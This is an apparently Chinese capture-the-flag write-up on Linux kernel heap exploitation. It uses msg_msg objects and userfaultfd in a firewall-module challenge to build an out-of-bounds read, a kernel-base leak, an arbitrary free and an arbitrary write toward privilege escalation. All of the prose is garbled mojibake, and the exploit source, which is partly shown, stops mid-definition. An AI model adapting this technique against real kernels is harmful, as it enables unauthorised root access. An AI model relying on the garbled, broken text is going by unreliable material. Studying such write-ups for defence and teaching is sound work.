<p>åœ¨ç®€å•æ¨¡å¼ä¸­ï¼Œå…¶å®å¿½ç•¥ä¸€ä¸ªmsgçš„åˆ©ç”¨æ–¹å¼ï¼Œé‚£å°±æ˜¯ä»»æ„free,åœ¨msgrev()ä¸­ä¼šæŠŠæ‰¾åˆ°çš„msgä»¥åŠå¯¹åº”çš„æ®µéƒ½ç»™freeæ‰ï¼Œç„¶åæŠŠè¿™ä¸ªmsgä»<code>msg_queue</code>ä¸­è„±é“¾ï¼Œæ‰€ä»¥å¦‚æœèƒ½æ§åˆ¶<code>msg</code>çš„è¯å¯ä»¥æ§åˆ¶nextè®©å…¶æŒ‡å‘ä¸€ä¸ªobjectåœ°å€ï¼Œç„¶åå†<code>msgrcv()</code>,å¦‚æœä¼ªé€ nextåˆç†çš„è¯ï¼Œå°±ä¼šæŠŠnextç»™freeæ‰äº†ï¼Œè¿™å°±æ„æˆäº†ä»»æ„åœ°å€freeçš„æ•ˆæœã€‚</p>
<p>åœ¨å°äº0x1000å°ºå¯¸çš„objectçš„msgåˆ©ç”¨ä¸­ï¼Œå°±æ˜¯å…ˆè¿›è¡Œä»»æ„free,ç„¶åé€šè¿‡ä»»æ„freeæ„é€ å‡ºä»»æ„åœ°å€å†™ï¼Œå…·ä½“æ€è·¯å¦‚ä¸‹</p>
<h2 id="åˆ©ç”¨æ€è·¯"><a href="#åˆ©ç”¨æ€è·¯" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h2><p><strong>1</strong>.é¦–å…ˆæ“ä½œå¦‚ä¸‹ï¼Œç”³è¯·ä¸‰ä¸ªmsg_id,ç„¶åå‘msg_id[0]ç”³è¯·ä¸€ä¸ª0x40å¤§å°çš„msg,è¿™ä¸ªmsgæ˜¯å¯ä»¥æ§åˆ¶çš„ï¼Œå‘msg_id[1]ç”³è¯·ä¸¤ä¸ªmsgï¼Œç¬¬ä¸€ä¸ªå¤§å°æ˜¯0x40,ç¬¬äºŒä¸ªå¤§å°æ˜¯0x2000ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msg_id[<span class="number">0</span>]=make_queue(IPC_PRIVATE,<span class="number">0666</span>|IPC_CREAT);</span><br><span class="line">msg_id[<span class="number">1</span>]=make_queue(IPC_PRIVATE,<span class="number">0666</span>|IPC_CREAT);</span><br><span class="line">msg_id[<span class="number">2</span>]=make_queue(IPC_PRIVATE,<span class="number">0666</span>|IPC_CREAT);</span><br><span class="line">add_rule(fd,<span class="number">0</span>,INBOUND);</span><br><span class="line">   dup_rule(fd,<span class="number">0</span>,INBOUND);</span><br><span class="line">   del_rule(fd,<span class="number">0</span>,INBOUND);</span><br><span class="line">   msg-&gt;mtype=<span class="number">1</span>;</span><br><span class="line">   <span class="built_in">memset</span>(msg-&gt;mtext,<span class="number">0x61</span>,<span class="number">0x1000</span>);</span><br><span class="line">   send_msg(msg_id[<span class="number">0</span>],msg,<span class="number">0x10</span>,IPC_NOWAIT);</span><br><span class="line">   <span class="built_in">memset</span>(msg-&gt;mtext,<span class="number">0x62</span>,<span class="number">0x1000</span>);</span><br><span class="line">   send_msg(msg_id[<span class="number">1</span>],msg,<span class="number">0x10</span>,IPC_NOWAIT);</span><br><span class="line">   <span class="built_in">memset</span>(msg-&gt;mtext,<span class="number">0x63</span>,<span class="number">0x1000</span>);</span><br><span class="line">   send_msg(msg_id[<span class="number">1</span>],msg,<span class="number">0x1fc8</span>,IPC_NOWAIT);</span><br></pre></td></tr></table></figure>

<p>ç„¶å0x40çš„slabä¸Šå¯èƒ½å‡ºç°çš„æƒ…å†µå¦‚å›¾ï¼Œæ”¹å¤§ä¸Šé¢çš„msgçš„<code>m_ts</code>å°±å¯ä»¥è¶Šç•Œè¯»äº†ï¼Œæœ€ä¸»è¦çš„æ˜¯è¯»åˆ°msg_id[1]çš„0x40çš„msgçš„ll_prev,ll_next,å…¶ä¸­ll_prevæŒ‡å‘äº†msg_id[1]çš„msg_queue,ll_nextæŒ‡å‘äº†msg_id[1]çš„ä¸‹ä¸€ä¸ª0x2000çš„msgï¼Œç„¶åè¿˜å¯ä»¥æ ¹æ®è¿™ä¸ªè¶Šç•Œè¯»æ³„éœ²å†…æ ¸åœ°å€ï¼Œä½†æ˜¯è¿™ä¸ªå†…æ ¸åœ°å€çš„é€‰æ‹©ä¸èƒ½è¢«fg_kaslrå½±å“ï¼Œæˆ‘é€‰æ‹©çš„æ˜¯<code>error_injection_list</code>è¿™ä¸ªæŒ‡å‘å†…æ ¸æ•°æ®æ®µçš„åœ°å€ç®—å‡ºkernelbaseã€‚</p>
<p><img src="https://syst3mfailure.io/assets/images/wall_of_perdition/1.png" alt="debug"></p>
<p> <strong>2</strong>.å†åˆ©ç”¨msg_id[0]çš„msgè¿›è¡Œä»»æ„è¯»ï¼Œè¯»å–å½“å‰è¿›ç¨‹çš„<code>task_struct</code>ï¼Œè¿™ä¸ªå’Œç®€å•æ¨¡å¼ä¸€æ ·å°±ä¸èµ˜è¿°ã€‚</p>
<p><strong>3</strong>.æ„é€ ä»»æ„free,é¦–å…ˆæŠŠmsg_id[1]çš„æ‰€æœ‰msgå…¨éƒ¨é‡Šæ”¾ï¼Œç”±äºè¿™ä¸ªå†…æ ¸æ˜¯slabåˆ†é…ï¼Œä¸”slabæ˜¯åè¿›å…ˆå‡ºçš„ï¼Œåœ¨é‡Šæ”¾0x2000çš„msgçš„æ—¶å€™é¦–å…ˆé‡Šæ”¾msg_msg,ç„¶åå†é‡Šæ”¾ä»–çš„æ®µï¼Œæ‰€ä»¥å½“å†ä½¿ç”¨msg_id[2]ç”³è¯·ä¸€ä¸ª0x2000çš„msgçš„æ—¶å€™ï¼Œä¹‹å‰çš„æ®µå°±è¢«å½“æˆmsg_msg,åŸå…ˆçš„msg_msgå°±è¢«å½“æˆæ®µäº†ï¼Œå†åŠ ä¸Šå¦‚æœç”³è¯·è¿™ä¸ªmsgçš„æ—¶å€™msgsndä¼ å…¥çš„æ˜¯ä¸€ä¸ªuserfaultæ£€æµ‹çš„é¡µï¼Œæ­¤æ—¶å†è®©msg_id[0]çš„msgçš„nextæŒ‡å‘è¿™ä¸ªæ®µå†é‡Šæ”¾è¿™ä¸ªmsg,å°±ä¼šæŠŠåˆšæ‰ç”³è¯·çš„æ®µç»™é‡Šæ”¾æ‰ï¼Œå›¾ç¤ºå¦‚ä¸‹</p>
<p><img src="https://syst3mfailure.io/assets/images/wall_of_perdition/5.png" alt="debug"></p>
<p>å†é‡Šæ”¾</p>
<p><img src="https://syst3mfailure.io/assets/images/wall_of_perdition/9.png" alt="debug"></p>
<p>æ­¤æ—¶å°±ç›¸å½“äºä»»æ„freeäº†ï¼Œä½†æ˜¯freeçš„æ˜¯ä¸ªæ­£åœ¨åˆå§‹åŒ–çš„msgçš„æ®µï¼Œæˆ‘ä»¬éšæ—¶å¯ä»¥å‘è¿™ä¸ªè¢«freeçš„æ®µé‡Œå†™å…¥æ•°æ®ã€‚</p>
<p><strong>4</strong>.ä»»æ„å†™ï¼Œæ­¤æ—¶msg_id[2]çš„msg.nextæŒ‡å‘è¢«freeçš„4Ké¡µï¼Œä¸”èƒ½éšæ—¶å‘è¿™ä¸ªé¡µé¢é‡Œå†™å…¥æ•°æ®ï¼Œæ‰€ä»¥å¯ä»¥å†ç”³è¯·ä¸€ä¸ª0x1000-0x30+0x10çš„msgæŠŠè¿™ä¸ªé¡µå†ç”³è¯·å‡ºæ¥å½“æ–°çš„msgçš„msg_msgï¼Œç”³è¯·è¿™ä¸ªé¡µçš„æ—¶å€™ä¼ å…¥çš„ç”¨æˆ·æ€çš„å†…å­˜ä¹Ÿæ˜¯è¢«userfaultæ£€æµ‹çš„ã€‚</p>
<p>åˆ°è¿™é‡Œå°±æœ‰ä¸¤ä¸ªcome_from_user()è¢«å¡ä¸»äº†ï¼Œå¦‚å›¾æ‰€ç¤ºï¼Œæˆ‘ä»¬å…ˆè®©çº¢è‰²çš„msgé€šè¿‡ï¼Œè¿™æ ·å°±èƒ½ä¿®æ”¹è“è‰²çš„msg_msgäº†ï¼Œä¿®æ”¹è¿™ä¸ªmsg_msgçš„nextä¸ºä»»æ„åœ°å€ï¼Œç„¶åå†è®©è“è‰²çš„msgé€šè¿‡ï¼Œè¿™æ ·åœ¨åˆå§‹åŒ–è¿™ä¸ªmsgçš„æ®µçš„æ—¶å€™å°±ä¼šå‘ä»»æ„åœ°å€å†™ä»»æ„å†…å®¹äº†ã€‚</p>
<p><img src="https://syst3mfailure.io/assets/images/wall_of_perdition/10.png" alt="debug"></p>
<p>æ„Ÿè§‰è‡ªå·±è®²çš„å¾ˆå¨å±ä¸€æ ·ã€‚ã€‚ã€‚</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>æ€è·¯æ¯”è¾ƒé¥¶ï¼Œä½†æ€»ç»“æ¥çœ‹æœ€åå®ç°ä»»æ„åœ°å€å†™è¿˜æ˜¯é€šè¿‡æ§åˆ¶ä¸€ä¸ª4Kå¤§å°çš„msg_msgæ¥å®Œæˆçš„ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;byteswap.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/timerfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/reboot.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> page_size 0x1000</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ADD_RULE 0x1337babe</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DELETE_RULE 0xdeadbabe</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EDIT_RULE 0x1337beef</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHOW_RULE 0xdeadbeef</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DUP_RULE 0xbaad5aad</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INBOUND 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OUTBOUND 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SKIP -1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span> iface[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">char</span> ip[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">char</span> netmask[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">uint8_t</span> idx;</span><br><span class="line">    <span class="keyword">uint8_t</span> type;</span><br><span class="line">    <span class="keyword">uint16_t</span> proto;</span><br><span class="line">    <span class="keyword">uint16_t</span> port;</span><br><span class="line">    <span class="keyword">uint8_t</span> action;</span><br><span class="line">&#125; User_rule_t;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span> iface[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">uint32_t</span> ip;</span><br><span class="line">    <span class="keyword">uint32_t</span> netmask;</span><br><span class="line">    <span class="keyword">uint16_t</span> proto;</span><br><span class="line">    <span class="keyword">uint16_t</span> port;</span><br><span class="line">    <span class="keyword">uint8_t</span> action;</span><br><span class="line">    <span class="keyword">uint8_t</span> is_duplicated;</span><br><span class="line">&#125; Rule_t;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="keyword">long</span> mtype;</span><br><span class="line">        <span class="keyword">char</span> mtext[<span class="number">1</span>];</span><br><span class="line">&#125;user_msg;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">void</span> *ll_next;</span><br><span class="line">    <span class="keyword">void</span> *ll_prev;</span><br><span class="line">    <span class="keyword">long</span> m_type;</span><br><span class="line">    <span class="keyword">size_t</span> m_ts;</span><br><span class="line">    <span class="keyword">void</span> *next;</span><br><span class="line">    <span class="keyword">void</span> *security;</span><br><span class="line">&#125;msg_header;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> msg_id[<span class="number">3</span>]=&#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">size_t</span> <span class="built_in">queue</span>=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> kernelbase=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> page_msg=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> init_task=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> init_cred=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> vmlinux_nokaslr_addr=<span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="keyword">size_t</span> current_task=<span class="number">0</span>,prev_task=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> *page1=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> *page2=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">pthread_t</span> td[<span class="number">4</span>];</span><br><span class="line"><span class="keyword">int</span> is_write_msg=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;exp.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">err_exit</span><span class="params">(<span class="keyword">char</span> *err)</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[40;31m %s\e[0m\n&quot;</span>,err);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_IPv4</span><span class="params">(<span class="keyword">uint32_t</span> ip,<span class="keyword">char</span> *ipv4)</span></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(ipv4,<span class="number">0</span>,<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// printf(&quot;%d.%d.%d.%d\n&quot;,(ip&amp;0xff),(ip&amp;0x0000ff00)&gt;&gt;8,(ip&amp;0x00ff0000)&gt;&gt;16,(ip&amp;0xff000000)&gt;&gt;24);</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">sprintf</span>(ipv4,<span class="string">&quot;%d.%d.%d.%d&quot;</span>,(ip&amp;<span class="number">0xff</span>),(ip&amp;<span class="number">0x0000ff00</span>)&gt;&gt;<span class="number">8</span>,(ip&amp;<span class="number">0x00ff0000</span>)&gt;&gt;<span class="number">16</span>,(ip&amp;<span class="number">0xff000000</span>)&gt;&gt;<span class="number">24</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">User_rule_t* <span class="title">init_user_rule</span><span class="params">(<span class="keyword">uint8_t</span> idx,<span class="keyword">uint8_t</span> type,<span class="keyword">u_int32_t</span> ip,<span class="keyword">u_int32_t</span> netmask)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    User_rule_t *user_rule=(User_rule_t *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(User_rule_t));</span><br><span class="line"></span><br><span class="line">    user_rule-&gt;idx=idx;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    get_IPv4(ip,&amp;(user_rule-&gt;ip));</span><br><span class="line"></span><br><span class="line">    get_IPv4(netmask,&amp;(user_rule-&gt;netmask));</span><br><span class="line"></span><br><span class="line">    user_rule-&gt;type=type;</span><br><span class="line">    <span class="keyword">return</span> user_rule;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> 